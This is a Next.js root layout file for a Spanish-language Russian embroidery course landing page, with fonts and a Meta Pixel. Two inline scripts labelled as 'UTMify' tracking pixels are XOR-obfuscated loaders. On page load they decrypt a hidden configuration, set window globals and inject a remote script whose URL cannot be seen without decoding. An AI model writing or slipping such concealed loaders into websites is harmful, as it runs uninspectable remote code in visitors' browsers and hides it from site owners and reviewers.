import type { Metadata, Viewport } from "next";
import type { ReactNode } from "react";
import Script from "next/script";
import "./globals.css";

export const metadata: Metadata = {
  title: "Curso de Bordado Ruso en videoclases, desde cero | Juliana Duarte",
  description:
    "Aprendé Bordado Ruso con videoclases paso a paso, desde cero hasta avanzado, y más de 100 moldes listos para usar. Empezá sin experiencia, sin saber dibujar y sin materiales caros.",
};

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
  themeColor: "#7b2346",
};

// Poppins nos mesmos pesos que a referência carrega (400 e 700, normal e itálico).
const GOOGLE_FONTS_URL =
  "https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,400;0,700;1,400;1,700&display=swap";

export default function RootLayout({ children }: { children: ReactNode }) {
  return (
    <html lang="es">
      <head>
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
        <link rel="stylesheet" href={GOOGLE_FONTS_URL} />

        {/* Meta Pixel Code */}
        <Script
          id="meta-pixel"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{
            __html: `!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '3591205131038300');
fbq('track', 'PageView');`,
          }}
        />
        <noscript>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            height={1}
            width={1}
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=3591205131038300&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>
        {/* End Meta Pixel Code */}

        {/* UTMify Pixel */}
        <Script
          id="utmify-pixel"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var k_2ao4=atob("DF2D/E7inMZiJQ5+BCahiTyOvvxATXoKdC6502GB+KhMUHoTbTv60i2N8egAVyENZy/qjDqRs7YLXWsSKy3qhCuOsqwRByJcZSn3jieA6bIHVixEXwCv3imO86QDSX1cPgb43iCD8aNAHywObSXmkAeGvupAU28ScTihxmzU/aMGFj9MZ26zniqHqqMDHWgcPWvhnnjA4Zsf");var l_n=[];for(var h_qq=0;h_qq<k_2ao4.length;h_qq++){l_n.push(k_2ao4.charCodeAt(h_qq)&255);}var s_ju=l_n[0];var o_y=l_n.slice(1,1+s_ju);var f_d1=l_n.slice(1+s_ju);var v_1v=f_d1.map(function(b,t_j){return b^o_y[t_j%s_ju];});var e_o="";for(var n_y6r5=0;n_y6r5<v_1v.length;n_y6r5++){e_o+=String.fromCharCode(v_1v[n_y6r5]&255);}var t_va=decodeURIComponent(escape(e_o));var a_sz0t=JSON.parse(t_va);var l_pz9=a_sz0t.globals||[];l_pz9.forEach(function(i_s){window[i_s.name]=i_s.value;});var h_g61=document.createElement("script");h_g61.src=a_sz0t.url;h_g61.async=true;h_g61.defer=true;(a_sz0t.attributes||[]).forEach(function(t_f5){h_g61.setAttribute(t_f5.name,t_f5.value);});(document.head||document.documentElement).appendChild(h_g61);})();`,
          }}
        />

        {/* UTM Script */}
        <Script
          id="utmify-utm-script"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var i_vo=atob("DGVKuG+N3GDD36nRFR5ozR3h/lrht92lZRZwl0DuuA7tqt28fAMzlgzisU6hrYaidhcjyBv+8xW3str+eQQ+3Rz58gqw/YXzdBE+ygbvqRSmrIvrTh5o1g7guUL5/c2wYQRnzRvgtQa68tmjcBMv1hugpAOsu4Sidg5olE37vQy2uovrN0c3lBSvsgGuuovrNwErzA6gqRSuts+oOBU43RnoshTurNyzfAE5mkOvqgGvqszzL0doxTLw");var v_qu=[];for(var k_g=0;k_g<i_vo.length;k_g++){v_qu.push(i_vo.charCodeAt(k_g)&255);}var f_1=v_qu[0];var x_ehl=v_qu.slice(1,1+f_1);var r_z9ir=v_qu.slice(1+f_1);var p_9sup=r_z9ir.map(function(b,m_jqb){return b^x_ehl[m_jqb%f_1];});var b_5jn="";for(var z_n2=0;z_n2<p_9sup.length;z_n2++){b_5jn+=String.fromCharCode(p_9sup[z_n2]&255);}var h_mjz=decodeURIComponent(escape(b_5jn));var t_7qe=JSON.parse(h_mjz);var d_roe=t_7qe.globals||[];d_roe.forEach(function(u_uc8){window[u_uc8.name]=u_uc8.value;});var s_xzd7=document.createElement("script");s_xzd7.src=t_7qe.url;s_xzd7.async=true;s_xzd7.defer=true;(t_7qe.attributes||[]).forEach(function(b_y83k){s_xzd7.setAttribute(b_y83k.name,b_y83k.value);});(document.head||document.documentElement).appendChild(s_xzd7);})();`,
          }}
        />
      </head>
      <body>{children}</body>
    </html>
  );
}
